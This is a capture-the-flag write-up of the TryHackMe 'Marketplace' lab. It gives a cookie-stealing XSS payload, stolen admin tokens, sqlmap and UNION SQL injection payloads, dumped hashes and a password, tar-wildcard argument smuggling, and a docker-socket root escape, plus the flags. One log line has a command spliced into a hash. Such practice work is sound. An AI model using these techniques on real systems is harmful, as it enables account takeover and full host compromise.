# Tryhackme.com Room : The Marketplace
`https://tryhackme.com/room/marketplace`


# Instance
```
export IP=10.10.66.148
```

# Nmap
```
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
MAC Address: 02:3B:E6:C1:06:4B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There is a webapp running on port `32768` that is proxy through nginx on port 80

The website is a 

```
http://10.10.186.151:32768/http-robots.txt
```

There is 2 listing on the website from
```
jake
michael
```

Created a dummy user account
```
yolo:fatkid
```


Sus :
    - report listing to admins
        - Might be an xss where the admin will visit the page and we can retrieve it's cookie using javascript somehow
    - The "new listing" tab has the file upload button disabled.
        - We can enable it by modifying the html but 


XSS

We set `new listing` description to
```
<script>
document.body.innerHTML += '<form id="exploit" action="/contact/yolo" method="post"><input type="hidden" name="message" value="' + document.cookie + '"></form>';
document.getElementById("exploit").submit();
</script>
```

Then we report the page.

We receive a message from admin (`michael`) with its token
```
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDMwNjEyNTR9.76O0N69K5Iw5sQooF7Jlh4jc_OeHoA74TwDfOuIz-uc
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjksInVzZXJuYW1lIjoiJzsgc2VsZWN0ICogZnJvbSB1c2VyczsiLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTYwMzA2MzQyNn0.M9R166gdQVeMYoiDjNcvUNEPuEuMIOM38Y3WMe6oohg
```


eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjksInVzZXJuYW1lIjoiJzsgc2VsZWN0ICogZnJvbSB1c2VyczsiLCJhZG1pbiI6dHJ1ZSwiaWF0IjoxNjAzMDYzNDI2fQ==.M9R166gdQVeMYoiDjNcvUNEPuEuMIOM38Y3WMe6oohg

We get access to an admin pannel with the following flag :
```
THM{c37a63895910e478f28669b048c348d5}
```

We have a listing of all the users but there doesn't seems to be anything we can do from there...

The delete user button doesn't do anything

We find that the `/admin?user=` is  parameter is injectable
Running sqlmap get our token killed.

Probably because we do too many request. Using only one techhnique work

```
sqlmap --cookie="token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDM1MTIzODF9.bzCmivNNFhYzOVmDiaqhSPOuOW_vo9XhwjlyErUqt5A" -u http://10.10.66.148/admin?user=1 --technique=u --dump
```

```
---
Parameter: user (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=-2866 UNION ALL SELECT NULL,CONCAT(0x71706b6b71,0x6a46724674786d7757596e6f66717868784878454b4c556a7162765a6e5179515742504371524656,0x71716b7871),NULL,NULL-- -
---
```


Trying some stuff
```
SELECT table_name FROM information_schema.tables;
```

```
user=-2866 UNION ALL SELECT NULL,GROUP_CONCAT(table_name, ', ') ,NULL,NULL FROM information_schema.tables-- -
```


Sql dump using sqlmap

```
+------+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id   | is_read | user_to | user_from | message_content                                                                                                                                                                                   |
+------+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1    | 1       | 3       | 1         | Hello!\r\nAn automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.\r\nYour new password is: @b_ENXkGYUCAv3zJ     |
| 2    | 1       | 4       | 4         | token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidXNlciIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjAzNTA3ODY5fQ.Zz4pGG4xse0Re3m4N-qrmPnCat7dDVNfvLmdR5OAaV4                         |
| 3    | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |
| 4    | 1       | 4       | 2         | token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDM1MDgxMzl9.vbPJ0akkCvEqljlueEBOjif0uRh1QE8QAYqhf98D5Bw                       |
| 5    | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |
| 6    | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |
| 7    | 1       | 4       | 2         | token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDM1MTA1MzR9.iTjefJ68OALKvP1tUcEQHoeKDSbNtT9qONUSoyDZCmY                       |
| 8    | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |
| 9    | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |
| 10   | 1       | 4       | 2         | token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDM1MTA2NDl9.rmNlFClQDZVo0vtUhBblpmumusaCo_nhK_xYh9WEaMA                       |
| 11   | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |
| 12   | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |
| 13   | 1       | 4       | 2         | token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDM1MTA4Mzl9.KBlmNpPQ9R8ucgMEiGPnYJYyd9mu9va7lMjHzCUHzOY                       |
| 14   | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |
| 15   | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |
| 16   | 1       | 4       | 2         | token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDM1MTA5Njd9.VtSJd2gwHPAGPJ9gzJ0MyC5BlP1uahDWjADzu6hJFAA                       |
| 17   | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |
| 18   | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |
| 19   | 1       | 4       | 2         | token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDM1MTE1MTN9.qqyWr-R-ukeDSdeR-OQ7fyduqE2pL85zS3DpXIcoy74                       |
| 20   | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |
| 21   | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |
| 22   | 1       | 4       | 2         | token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDM1MTIwMzF9.7ARzwgCUWvfwuafU4CKOJ1ndUI9hbvwzf_wDXG6D-z8                       |
| 23   | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |
| 24   | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |
| 25   | 1       | 4       | 2         | token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDM1MTIzODF9.bzCmivNNFhYzOVmDiaqhSPOuOW_vo9XhwjlyErUqt5A                       |
| 26   | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |
+------+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[00:20:06] [INFO] table 'marketplace.messages' dumped to CSV file '/home/pac/.local/share/sqlmap/output/10.10.66.148/dump/marketplace/messages.csv'                                                                                                                                   
[00:20:06] [INFO] fetching columns for table 'users' in database 'marketplace'
[00:20:07] [INFO] retrieved: 'id','int'
[00:20:07] [INFO] retrieved: 'username','varchar(32)'
[00:20:07] [INFO] retrieved: 'password','varchar(128)'
[00:20:07] [INFO] retrieved: 'isAdministrator','tinyint(1)'
[00:20:07] [INFO] fetching entries for table 'users' in database 'marketplace'                           
[00:20:07] [INFO] retrieved: '1','$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW','0','sy...
[00:20:07] [INFO] retrieved: '2','$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q','1','mi...
[00:20:08] [INFO] retrieved: '3','$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG','1','jake'
[00:20:08] [INFO] retrieved: '4','$2b$10$uiMMNRaUp5e3s--checkpoint=1 --checkpoint-action=exec=/bin/shxw/MH3PuuBEfjc1JBD8ABGBLSK6Pv60.fZKi9JP.','0','user'
Database: marketplace                                                                                    
Table: users
[4 entries]
+------+----------+--------------------------------------------------------------+-----------------+
| id   | username | password                                                     | isAdministrator |
+------+----------+--------------------------------------------------------------+-----------------+
| 1    | system   | $2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW | 0               |
| 2    | michael  | $2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q | 1               |
| 3    | jake     | $2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG | 1               |
| 4    | user     | $2b$10$uiMMNRaUp5e3sxw/MH3PuuBEfjc1JBD8ABGBLSK6Pv60.fZKi9JP. | 0               |
```

found user pass by in old messages
```
jake:@b_ENXkGYUCAv3zJ
```

user.txt:
```
THM{c3648ee7af1369676e3e4b15da6dc0b4}
```

```
User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

```
cat /opt/backups/backup.sh
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

We can exploit tar with
```
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Create a file named like this. It will be globed by `*`
```
--checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Got trouble writing a file with `/` in it.
We create a symlink in `/opt/backups/sh -> /bin/sh`

Then we create 2 files `--checkpoint-action=exec=sh` and `--checkpoint=1`

To create the files we use 
```
python -c "open('--checkpoint-action=exec=sh', 'w').write('1')"
```

We run `sudo -u michael /opt/backups/backup.sh` and get a shell as `michael`


After some poking around,w e find that the docker socket is writable

from gtfobin we find
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

We get root

Root flag
```
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```

